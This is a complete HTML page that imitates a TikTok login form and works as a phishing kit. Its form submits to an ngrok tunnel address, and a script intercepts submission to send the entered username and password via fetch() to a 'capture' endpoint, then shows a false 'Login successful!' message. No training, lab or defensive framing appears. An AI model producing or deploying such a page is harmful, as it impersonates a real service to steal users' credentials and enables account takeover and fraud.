<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TikTok Login</title>
    <style>
        body { font-family: Arial, sans-serif; }
        .container { width: 300px; margin: 0 auto; }
        .input { width: 100%; padding: 10px; margin: 10px 0; }
        .button { width: 100%; padding: 10px; background-color: #000000; color: #ffffff; border: none; cursor: pointer; }
    </style>
</head>
<body>
    <div class="container">
        <h2>TikTok Login</h2>
        <form action="https://0adf-102-213-251-33.ngrok-free.app" method="post">
            <input type="text" name="username" class="input" placeholder="Username" required>
            <input type="password" name="password" class="input" placeholder="Password" required>
            <button type="submit" class="button">Login</button>
        </form>
    </div>

    <script>
        document.querySelector('form').addEventListener('submit', function(event) {
            event.preventDefault();
            const formData = new FormData(event.target);
            fetch('https://your-capture-endpoint.com/capture', {
                method: 'POST',
                body: formData
            })
            .then(response => response.json())
            .then(data => {
                console.log('Success:', data);
                alert('Login successful!');
            })
            .catch((error) => {
                console.error('Error:', error);
                alert('Login failed. Please try again.');
            });
        });
    </script>
</body>
</html>
